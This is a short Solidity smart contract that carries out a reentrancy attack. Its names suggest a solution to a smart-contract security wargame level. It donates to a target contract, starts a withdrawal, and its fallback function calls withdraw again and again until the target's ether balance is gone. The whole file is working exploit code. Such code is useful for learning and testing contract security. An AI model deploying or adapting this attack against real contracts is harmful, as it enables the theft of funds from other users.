pragma solidity ^0.8.0;

interface Reentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external; 
}

contract ReentrancyAttack {
    Reentrance reentrance;

    constructor(address reentranceAddress) public{
        reentrance = Reentrance(reentranceAddress);
    }

    function loadEther() public payable {}

    function donateToContract(address target, uint amount) public{
        reentrance.donate{value:amount}(target);
    }

    function startWithdrawal(uint _amount) public{
        reentrance.withdraw(_amount);
    }

    fallback() external payable{
        while(address(reentrance).balance > 0){
            reentrance.withdraw(100000);
        }
    }
}